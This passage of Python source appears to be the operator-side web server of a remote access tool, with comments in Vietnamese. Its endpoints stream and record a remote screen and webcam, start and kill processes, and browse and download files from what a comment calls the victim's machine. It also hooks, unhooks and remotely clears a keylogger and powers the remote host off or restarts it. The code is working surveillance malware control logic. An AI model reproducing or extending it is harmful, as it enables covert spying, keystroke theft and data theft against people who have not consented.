                        if not img:
                            time.sleep(0.02)
                            continue

                        self.wfile.write(boundary)
                        self.wfile.write(b"Content-Type: image/jpeg\r\n")
                        self.wfile.write(f"Content-Length: {len(img)}\r\n\r\n".encode())
                        self.wfile.write(img)
                        self.wfile.write(b"\r\n")
                        # flush
                        try:
                            self.wfile.flush()
                        except Exception:
                            pass

                        # small delay to avoid busy loop; adjust for fps
                        time.sleep(0.05)
                    except BrokenPipeError:
                        # client disconnected
                        break
                    except Exception as e:
                        print("[HTTP] video_feed read/write error:", e)
                        time.sleep(0.1)
                        continue
            except Exception as e:
                print("[HTTP] video_feed outer exception:", e)
            return
        
        elif self.path == '/screen_feed':
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
            self.end_headers()

            try:
                while True:
                    # [SỬA] Bọc try-except để không bị crash khi C++ đang xóa file
                    try:
                        if os.path.exists(SCREEN_JPG):
                            with open(SCREEN_JPG, 'rb') as f: 
                                frame = f.read()
                            
                            if frame: 
                                self.wfile.write(b"--frame\r\n")
                                self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n")
                                self.wfile.write(frame)
                                self.wfile.write(b"\r\n")
                        else:
                            time.sleep(0.05)
                            
                    except (FileNotFoundError, PermissionError, OSError):
                        # Lỗi đọc file -> Bỏ qua frame này, chờ frame sau
                        time.sleep(0.02)
                        continue
                    
                    time.sleep(0.05) 
            except (ConnectionResetError, BrokenPipeError, ValueError):
                pass
            return
        
        # --- [MỚI] API START RECORD SCREEN ---
        elif self.path == '/api/screen/record/start':
            if not is_recording_screen:
                is_recording_screen = True
                t_str = time.strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(BASE_DIR, f"screen_{t_str}.avi")
                
                t = threading.Thread(target=record_screen_task, args=(filename,))
                t.daemon = True
                t.start()
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"STARTED")
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ALREADY_RUNNING")
            return

        # --- [MỚI] API STOP RECORD SCREEN ---
        elif self.path == '/api/screen/record/stop':
            if is_recording_screen:
                is_recording_screen = False
                time.sleep(0.5)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"STOPPED")
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"NOT_RUNNING")
            return
        
        
        # --- [FIXED] API CHỤP ẢNH WEBCAM ---
        elif self.path == '/api/screen/snapshot':
            # Thử 5 lần, mỗi lần cách nhau 0.1s để tránh lúc C++ đang xóa file
            saved_ok = False
            fname = ""
            
            for i in range(5):
                if os.path.exists(SCREEN_JPG):
                    try:
                        ts = time.strftime("%Y%m%d_%H%M%S")
                        fname = f"screen_{ts}.jpg"
                        save_path = os.path.join(PICTURE_DIR, fname)
                        
                        # Copy file an toàn
                        shutil.copy2(SCREEN_JPG, save_path)
                        print(f"[SNAP] Saved: {save_path}")
                        saved_ok = True
                        break # Thành công thì thoát vòng lặp
                    except: 
                        pass # Lỗi thì thử lại
                time.sleep(0.1)

            if saved_ok:
                # Mở file vừa lưu để gửi về
                save_path = os.path.join(PICTURE_DIR, fname)
                with open(save_path, "rb") as f:
                    data = f.read()
                
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_error(404, "Screen busy or not ready")
            return
        
        # --- [FIXED] API START RECORD WEBCAM ---
        elif self.path == '/api/webcam/record/start':
            # KHÔNG CẦN KHAI BÁO GLOBAL Ở ĐÂY NỮA (ĐÃ CÓ Ở ĐẦU HÀM)
            if not is_recording_webcam:
                is_recording_webcam = True
                # Tạo tên file
                t_str = time.strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(BASE_DIR, f"webcam_{t_str}.avi")
                
                # Chạy thread ghi hình
                t = threading.Thread(target=record_webcam_task, args=(filename,))
                t.daemon = True
                t.start()
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"STARTED")
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ALREADY_RUNNING")
            return

        # --- [FIXED] API STOP RECORD WEBCAM ---
        elif self.path == '/api/webcam/record/stop':
            # KHÔNG CẦN KHAI BÁO GLOBAL Ở ĐÂY NỮA
            if is_recording_webcam:
                is_recording_webcam = False
                time.sleep(0.5) # Chờ luồng ghi đóng file
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"STOPPED")
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"NOT_RUNNING")
            return
        
        elif self.path == '/api/webcam/snapshot':
            saved_ok = False
            fname = ""
            
            # Thử 5 lần liên tiếp để tránh xung đột file
            for i in range(5):
                if os.path.exists(WEBCAM_JPG):
                    try:
                        ts = time.strftime("%Y%m%d_%H%M%S")
                        fname = f"webcam_{ts}.jpg"
                        save_path = os.path.join(PICTURE_DIR, fname)
                        
                        shutil.copy2(WEBCAM_JPG, save_path)
                        print(f"[SNAP] Saved: {save_path}")
                        saved_ok = True
                        break 
                    except: 
                        pass 
                time.sleep(0.1)

            if saved_ok:
                # Mở file vừa lưu để gửi về client
                save_path = os.path.join(PICTURE_DIR, fname)
                with open(save_path, "rb") as f:
                    data = f.read()
                
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_error(404, "Webcam busy or not ready")
            return
        
        elif self.path == '/api/screen/snapshot':
            if os.path.exists(SCREEN_JPG):
                ts = time.strftime("%Y%m%d_%H%M%S")
                fname = f"screen_{ts}.jpg"
                save_path = os.path.join(PICTURE_DIR, fname)
                
                try:
                    shutil.copy2(SCREEN_JPG, save_path)
                    print(f"[SNAP] Saved: {save_path}")
                except: pass

                with open(SCREEN_JPG, "rb") as f:
                    data = f.read()
                
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_error(404, "Screen not ready")
            return
        

        # mặc định: phục vụ file tĩnh / index
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        global webcam_running
        global is_recording_webcam, is_recording_screen
        print("[HTTP] POST", self.path)

        # ---- Start webcam
        if self.path == '/api/webcam/start':
            ok = start_mode("webcam")
            self.send_response(200 if ok else 500)
            self.end_headers()
            self.wfile.write(b"OK" if ok else b"ERR")
            return
        
        
        elif self.path == '/api/process/start':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(data.decode('utf-8'))
                app_name = payload.get('name', '')
            except:
                app_name = ''
            if not app_name:
                self.send_response(400); self.end_headers(); self.wfile.write(b'No app'); return

            ok = False
            if lib:
                try:
                    with lib_lock:
                        lib.StartProcess(app_name.encode('utf-8'))
                    ok = True
                except Exception as e:
                    print("[HTTP] StartProcess error:", e)

            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return
        
        
        elif self.path == '/api/files/list':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(data.decode('utf-8'))
                path = payload.get('path', '')
            except: path = ''

            entries = []
            if lib and path:
                try:
                    with lib_lock:
                        ptr = lib.ExplorePath(path.encode('utf-8'))
                    
                    if ptr:
                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
                        lines = data_str.split('\n')
                        for line in lines:
                            p = line.strip().split('|')
                            if len(p) >= 3:
                                entries.append({"name": p[0], "type": p[1], "size": p[2]})
                except Exception as e:
                    print("[HTTP] ExplorePath error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(entries).encode())
            return
        
        # --- [MỚI] API DOWNLOAD FILE TỪ MÁY NẠN NHÂN ---
        elif self.path == '/api/files/download':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(data.decode('utf-8'))
                remote_path = payload.get('path', '')
            except: remote_path = ''

            if not remote_path or not lib:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": "Bad Request"}).encode())
                return

            # 1. Lấy tên file
            filename = os.path.basename(remote_path)
            # 2. Đường dẫn lưu trên Server (Folder download)
            local_save_path = os.path.join(DOWNLOAD_DIR, filename)

            # Xóa file cũ nếu trùng
            if os.path.exists(local_save_path):
                try: os.remove(local_save_path)
                except: pass

            print(f"[DOWN] Downloading: {remote_path} -> {local_save_path}")

            try:
                with lib_lock:
                    # Gọi DLL để tải file
                    lib.DownloadFile(remote_path.encode('utf-8'), local_save_path.encode('utf-8'))
                
                # Kiểm tra xem file đã về chưa
                if os.path.exists(local_save_path) and os.path.getsize(local_save_path) > 0:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    # Trả về tên file để JS tạo link tải
                    self.wfile.write(json.dumps({"ok": True, "file": filename}).encode())
                else:
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "error": "Download failed or empty file"}).encode())

            except Exception as e:
                print("[DOWN] Error:", e)
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode())
            return
        
        
        elif self.path == '/api/keylog/hook':
            ok = False
            if lib:
                try:
                    with lib_lock:
                        lib.HookKeylog()
                    ok = True
                except Exception as e:
                    print("[HTTP] HookKeylog error:", e)
            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return

        elif self.path == '/api/keylog/unhook':
            ok = False
            if lib:
                try:
                    with lib_lock:
                        lib.UnhookKeylog()
                    ok = True
                except Exception as e:
                    print("[HTTP] UnhookKeylog error:", e)
            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return
        
        elif self.path == '/api/keylog/clear':
            try:
                # 1. Xóa file trên máy Python (Local)
                with open(KEYLOG_TXT, "w") as f:
                    f.write("") 

                # 2. [MỚI] Gửi lệnh xóa file gốc trên máy Nạn nhân (Remote)
                if lib:
                    with lib_lock:
                        lib.ClearKeylogRemote()

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True}).encode())
            except Exception as e:
                print("[API] Clear error:", e)
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False}).encode())
            return
        
        # Mode control (Web dashboard)
        elif self.path in ('/api/set_mode', '/api/mode'):
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(body.decode('utf-8'))
                mode = payload.get('mode')
            except Exception:
                mode = None

            if not mode:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "error",
                    "msg": "Bad mode"
                }).encode())
                return

            if mode not in MODES:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "error",
                    "msg": "Unknown mode"
                }).encode())
                return

            ok = start_mode(mode)
            if ok:
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "ok",
                    "mode": mode
                }).encode())
            else:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "error"
                }).encode())
            return
        
        # ---- Stop webcam
        elif self.path == '/api/webcam/stop':
            webcam_running = False
            if lib:
                try:
                    with lib_lock:
                        # use STOP (matches main.py behavior) to gracefully stop streaming
                        lib.SendStringCmd(b"STOP")
                    print("[API] Sent STOP to DLL.")
                except Exception as e:
                    print("[API] Send STOP error:", e)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        # ---- Kill process (body JSON {pid: "1234"})
        elif self.path == '/api/kill':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            pid = None
            try:
                payload = json.loads(data.decode('utf-8'))
                pid = payload.get('pid')
            except Exception:
                try:
                    pid = data.decode('utf-8')
                except:
                    pid = None
            if pid and lib:
                try:
                    with lib_lock:
                        lib.KillProcess(pid.encode('utf-8'))
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": True}).encode())
                except Exception as e:
                    print("[API] KillProcess error:", e)
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(str(e).encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Bad Request or DLL not loaded")
            return

        elif self.path == '/api/screen/record':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            duration = 10
            try:
                payload = json.loads(data.decode('utf-8'))
                d = int(payload.get('duration', 10))
                if d > 0:
                    duration = d
            except Exception:
                pass

            if not lib:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": "No DLL"}).encode())
                return

            def record_task():
                try:
                    print(f"[REC] Bắt đầu quay màn hình {duration}s...")
                    lib.ReceiveVideoStream(duration)
                    print("[REC] Kết thúc quay màn hình.")
                except Exception as e:
                    print("[REC] error:", e)

            threading.Thread(target=record_task, daemon=True).start()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": True, "duration": duration}).encode())
            return
        
        elif self.path == '/api/screen/snapshot':
            # call CaptureScreen (DLL) to produce screenshot.bmp or screenshot.jpg
            if not lib:
                self.send_response(500); self.end_headers(); self.wfile.write(b"No DLL"); return

            # remove old
            try:
                if os.path.exists(SCREENSHOT_BMP):
                    os.remove(SCREENSHOT_BMP)
            except:
                pass

            try:
                with lib_lock:
                    lib.CaptureScreen()
            except Exception as e:
                print("[HTTP] CaptureScreen error:", e)
                self.send_response(500); self.end_headers(); self.wfile.write(b"Capture error"); return

            ok = wait_for_file(SCREENSHOT_BMP, timeout=3.0, poll=0.05)
            if not ok:
                self.send_response(500); self.end_headers(); self.wfile.write(b"Screenshot not ready"); return

            with open(SCREENSHOT_BMP, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "image/bmp")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return
        
        elif self.path == '/api/webcam/record/start':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            duration = 0
            try:
                payload = json.loads(data.decode('utf-8'))
                duration = int(payload.get('duration', 0))
            except: pass

            if not is_recording_webcam:
                is_recording_webcam = True
                t_str = time.strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(BASE_DIR, f"webcam_{t_str}.avi")
                
                # Truyền duration vào thread
                t = threading.Thread(target=record_webcam_task, args=(filename, duration))
                t.daemon = True
                t.start()
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True}).encode())
            else:
                self.send_response(200) # Đang chạy rồi thì thôi
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "msg": "Running"}).encode())
            return

        # --- [MỚI] API STOP RECORD WEBCAM ---
        elif self.path == '/api/webcam/record/stop':
            if is_recording_webcam:
                is_recording_webcam = False
                time.sleep(0.5) # Chờ luồng ghi đóng file
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"STOPPED")
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"NOT_RUNNING")
            return
        
        elif self.path == '/api/power':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            action = None
            try:
                payload = json.loads(data.decode('utf-8'))
                action = (payload.get('action') or "").lower()
            except Exception:
                pass

            if not lib or not action:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": "Bad request or no DLL"}).encode())
                return

            ok = False
            try:
                with lib_lock:
                    if action == "shutdown" and hasattr(lib, "ShutdownServer"):
                        lib.ShutdownServer()
                        ok = True
                    elif action == "restart" and hasattr(lib, "RestartServer"):
                        lib.RestartServer()
                        ok = True
            except Exception as e:
                print("[HTTP] power error:", e)

            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return
        
        elif self.path == '/api/screen/record/start':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            duration = 0
            try:
                payload = json.loads(data.decode('utf-8'))
                duration = int(payload.get('duration', 0))
            except: pass

            if not is_recording_screen:
                is_recording_screen = True
                t_str = time.strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(BASE_DIR, f"screen_{t_str}.avi")
                
                t = threading.Thread(target=record_screen_task, args=(filename, duration))
                t.daemon = True
                t.start()
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True}).encode())
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "msg": "Running"}).encode())
            return
        
        else:
            self.send_error(404)
            return
        

# ---------------- RUN BOTH HTTP + WS ----------------
def run_http_server():
    os.chdir(BASE_DIR)
    print("CWD ->", os.getcwd())
    with ThreadingTCPServer(("0.0.0.0", HTTP_PORT), IoTRequestHandler) as httpd:
        print(f"-> [WEB UI] Access: http://localhost:{HTTP_PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Shutting down HTTP server...")

if __name__ == "__main__":
    # start ws bridge thread
    t = threading.Thread(target=ws_listen_thread, daemon=True)
    t.start()
    print("[MAIN] Started WS bridge thread (port {})".format(WS_PORT))
    print("\n--- STARTING WEBAPP (with built-in WS bridge) ---")
    run_http_server()
